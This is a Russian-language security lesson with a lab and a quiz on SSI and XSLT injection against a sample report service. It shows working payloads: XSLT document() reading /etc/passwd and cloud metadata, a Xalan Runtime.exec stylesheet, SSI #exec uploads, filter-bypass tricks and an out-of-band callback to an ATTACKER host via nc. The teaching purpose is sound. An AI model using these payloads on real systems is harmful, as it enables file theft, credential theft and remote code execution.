---
id: web-ssi-xslt-injection
title: "SSI- и XSLT-инъекции: парсеры за пределами шаблонов"
category: web
parent: web-ssti-core
difficulty: hard
order: 1
tags: [ssi, xslt, injection, xml, rce]
prerequisites: [web-ssti, web-xxe]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Server-Side Includes и XSLT-инъекции: выполнение директив и трансформаций, чтение файлов, SSRF и RCE."
lab:
  kind: shell
  title: 'Практика: XSLT-инъекция → чтение файла'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md, data.xml, evil.xsl]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Сервис применяет НАШ XSLT к присланному XML — изучи `evil.xsl`.'
    - 'Функция `unparsed-text(''file:///flag'')` читает файл сервера.'
    - 'Отправь шаблон: `curl -s -X POST https://reports.example/report -H ''Content-Type: application/xml'' --data-binary @evil.xsl`.'
    - 'Запиши ответ в found.txt и набери `check`.'
---

## Вопрос, с которого всё начинается

На прошлом уроке мы заставляли **шаблонизатор** выполнять наш текст. Но на сервере есть и другие «исполнители»: сам веб-сервер умеет выполнять директивы прямо в HTML, а XML-процессор умеет превращать один документ в другой по заданному описанию. Разработчики закрывают шаблонизатор, но забывают, что эти движки — **отдельные**, со своими возможностями.

Вопрос: что, если сервер применит **наш** XSLT-шаблон к документу? Или отдаст страницу, в которой выполнит нашу SSI-директиву? Сегодня разберём оба механизма на одном примере — сервисе генерации отчётов.

## Наш пример

Есть аналитический сервис `reports.example`. Он принимает XML с данными и XSLT-шаблон, который описывает, как этот XML превратить в HTML-отчёт. Отправим нормальные данные:

```bash
$ curl -s -X POST https://reports.example/report \
  -H 'Content-Type: application/xml' --data-binary @data.xml
<table><tr><td>Продажи</td><td>1200</td></tr></table>
```

Сервер применил XSLT и вернул HTML-таблицу. Значит, **наш XSLT исполняется**. Что такое XSLT? Это язык преобразования XML: он описывает правила «взять узел и вывести что-то». Это полноценный язык с функциями — и некоторые функции умеют читать файлы и ходить по сети.

## Шаг 1: читаем файлы через document()

Даже «безопасный» XSLT (без расширений) умеет загружать внешние ресурсы функцией `document()`. Проверим:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out><xsl:value-of select="document('/etc/passwd')"/></out>
  </xsl:template>
</xsl:stylesheet>
```

```bash
$ curl -s -X POST https://reports.example/report \
  -H 'Content-Type: application/xml' --data-binary @read.xsl
<out>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...</out>
```

`document()` загрузил локальный файл и вставил его содержимое в отчёт. Это LFI (чтение локальных файлов). Тот же вызов с URL даёт **SSRF** — запрос к внутреннему сервису:

```xml
<out><xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/></out>
```

`169.254.169.254` — адрес службы метаданных облака; он отдаёт временные ключи доступа к инфраструктуре. Один XSLT — и мы читаем и файлы, и внутреннюю сеть.

## Шаг 2: от чтения к выполнению команд

Некоторые XML-процессоры позволяют вызывать **расширения** — код на языке хостинга. В Java-процессорах (Xalan, Saxon) можно дёрнуть `java.lang.Runtime` через namespace:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="r" select="rt:getRuntime()"/>
    <xsl:variable name="p" select="rt:exec($r,'id')"/>
    <xsl:value-of select="ob:toString($p)"/>
  </xsl:template>
</xsl:stylesheet>
```

```bash
$ curl -s -X POST https://reports.example/report \
  -H 'Content-Type: application/xml' --data-binary @exec.xsl
java.lang.ProcessImpl@1a2b3c
```

Процесс запустился (мы видим объект процесса). Вывод команды забирают через `toString`/поток; если ответ пустой — подтверждают **OOB**-запросом: заставляют `Runtime.exec` обратиться к твоему listener. Аналогичные точки: в PHP `XSLTProcessor::registerPHPFunctions()` даёт `php:function('system','id')`, в .NET — блок `<msxsl:script>` с C#.

## Шаг 3: а что такое SSI

Теперь второй механизм. **SSI** (Server-Side Includes) — директивы, которые **веб-сервер** выполняет в HTML перед отдачей. Они выглядят как HTML-комментарии, поэтому их часто не видно в исходнике:

```html
<!--#echo var="DATE_LOCAL" -->
<!--#include virtual="/header.html" -->
<!--#exec cmd="id" -->
```

Файлы с расширением `.shtml`, `.stm`, `.shtm` сервер обрабатывает SSI по умолчанию. Ключевая директива — `#exec`: она выполняет команду. Если форма загрузки разрешает `.shtml` (или сервер включает SSI на `.html`), это прямой RCE:

```bash
$ cat > evil.shtml <<'EOF'
<!--#exec cmd="id" -->
EOF
$ curl -s -F 'file=@evil.shtml;type=text/html' https://reports.example/upload
{"url":"/uploads/evil.shtml"}
$ curl -s https://reports.example/uploads/evil.shtml
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uid=33(www-data)` — команда выполнена веб-сервером. Признак SSI-обработки: расширение `.shtml`/`.stm` и строка `<!--#` в исходниках страницы.

## Шаг 4: как понять, какой механизм перед тобой

Оба вектора начинаются с вопроса «что сервер делает с моим файлом». Сравним:

| Критерий | SSI | XSLT |
|----------|-----|------|
| Где живёт | веб-сервер (Apache/nginx/IIS) | XML-процессор приложения |
| Признак | `.shtml`, `<!--#` | обработка `.xsl`/XML-шаблонов |
| RCE | `#exec cmd=` | расширения (Java/.NET/PHP) |
| LFI | `#include virtual=` | `document()` |
| Обход | смена расширения | XInclude, внешний DTD |
| Типичная точка | загрузка файлов | генератор отчётов, SOAP |

Практический тест: загрузи безобидную директиву `<!--#echo var="DATE_LOCAL" -->`. Если в предпросмотре появилась дата — SSI активен. Для XSLT подай тривиальный шаблон и проверь, что виден результат трансформации.

## Шаг 5: обход фильтров

- **`.shtml` запрещён** → попробуй `.stm`, `.shtm`, регистр `.SHTML`.
- **`<!DOCTYPE` запрещён** → используй `XInclude` или внешний XSLT.
- **`document()` заблокирован** → `xsl:include`/`xsl:import` с URL даёт похожий доступ.
- **Расширения запрещены** → вернись к LFI/SSRF через `document()`: это тоже ценная находка.
- **WAF ищет `<script`/`SELECT`** → SSI-директивы выглядят как комментарии и часто проходят, а XSLT внутри SOAP-тела не инспектируется.

## Шаг 6: как не спутать с XXE

XSLT-точки часто путают с **XXE** (внедрением внешних XML-сущностей) — обе связаны с XML, и обе могут читать файлы. Разница в механизме. XXE использует **внешние сущности** (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`), которые подставляет сам XML-парсер при чтении документа. XSLT же читает файлы через **функцию `document()`** внутри самого шаблона преобразования. Бывает и то и другое одновременно: документ сначала парсится (XXE), потом к нему применяется XSLT. Поэтому в чек-листе проверяй оба варианта:

```xml
<!-- XXE: сущность в самом XML -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

```xml
<!-- XSLT: document() в шаблоне -->
<out><xsl:value-of select="document('/etc/passwd')"/></out>
```

Если `<!DOCTYPE` запрещён, а `document()` работает — остаётся XSLT. Если работает только сущность — это XXE (подробнее в `web-xxe`).

## Что мы теперь знаем

- SSI и XSLT — «исполнители вне шаблонизатора»: веб-сервер и XML-процессор.
- SSI-директива `#exec cmd=` выполняет команду ОС; `#include` читает файлы.
- XSLT-функция `document()` читает файлы (LFI) и ходит по сети (SSRF).
- Расширения XSLT (Java/PHP/.NET) дают полный RCE.
- Искать надо там, где есть загрузка `.shtml`/`.xsl`/XML/SVG или «генератор отчётов»/SOAP.
- Артефакт — вывод `id` (RCE), содержимое файла (LFI) или OOB-запрос (blind).

## На что смотреть дальше

- **Держи SSI и XSLT в одном чек-листе рекогносцировки:** приложение, уязвимое к одному, часто уязвимо и к другому — обе поверхности связаны с обработкой пользовательских файлов.
- **Не путай XSLT и XPath-инъекцию** (`web-xpath-injection`) — это разные механизмы.
- **SVG тоже может содержать XSLT** — загрузка картинки становится вектором.
- **SOAP/WS-Security** часто применяет XSLT к сообщениям; WAF туда не смотрит.
- **Blind-случай:** ответ пуст, но команда выполнилась — подтверждай OOB-запросом к своему listener. Разверни `nc -lvnp 4444` и заставь XSLT дёрнуть `document('http://ATTACKER:4444/x')`; пришедший запрос доказывает выполнение.
- **Только с согласия.** `#exec` и расширения — реальное выполнение кода на проде.
- **Проверяй сам факт обработки:** загрузи безобидный `.shtml`/`.xsl` и посмотри, меняется ли ответ — это дешевле, чем сразу строить цепочку под неизвестный движок.

## Квиз

Проверь себя.

```quiz
- question: "Что такое SSI?"
  options:
    - "SQL-инъекция"
    - "Директивы, которые веб-сервер выполняет в HTML"
    - "Шаблон Jinja2"
    - "Формат архива"
  answer: 1
  explanation: "Server-Side Includes — обработка на уровне веб-сервера."
- question: "Какая SSI-директива выполняет команду?"
  options:
    - "#include"
    - "#exec cmd="
    - "#echo"
    - "#config"
  answer: 1
  explanation: "#exec запускает команду; #include включает файл."
- question: "Какую XSLT-функцию используют для LFI и SSRF?"
  options:
    - "open()"
    - "document()"
    - "read()"
    - "load()"
  answer: 1
  explanation: "document() загружает внешние ресурсы — файлы и URL."
- question: "Что даёт блок msxsl:script в .NET XSLT?"
  options:
    - "Кеширование"
    - "Выполнение C#/VB-кода (RCE)"
    - "Шифрование"
    - "Валидацию XML"
  answer: 1
  explanation: "Встроенный скрипт исполняется процессором — путь к RCE."
- question: "Ответ `java.lang.ProcessImpl@1a2b3c` на XSLT с `rt:exec(...)` означает:"
  options:
    - "Ошибка парсинга"
    - "Процесс запустился — подтверди вывод команды или OOB-запросом"
    - "XSLT не применён"
    - "Это SSI"
  answer: 1
  explanation: "Объект процесса означает, что Runtime.exec выполнился."
```

## Куда дальше

Дальше мы спустимся к следующему «исполнителю» — языку выражений внутри Java-приложений (**EL/OGNL**), который тоже выполняет твои строки как код. А пока главное запомни: **вне шаблонизатора есть ещё движки**, и если сервер обрабатывает твой XML, SVG или `.shtml` — ты уже близко к чтению файлов и выполнению кода.

## Где пригодится

- **CTF (Web):** задачи на SSI/XSLT.
- **Bug bounty:** XSLT RCE/SSRF — редкий критичный отчёт.
- **Пентест:** аудит экспорта/конвертации XML.
- **Работа (AppSec):** отключение SSI, sandbox XSLT, запрет `document()`/расширений.
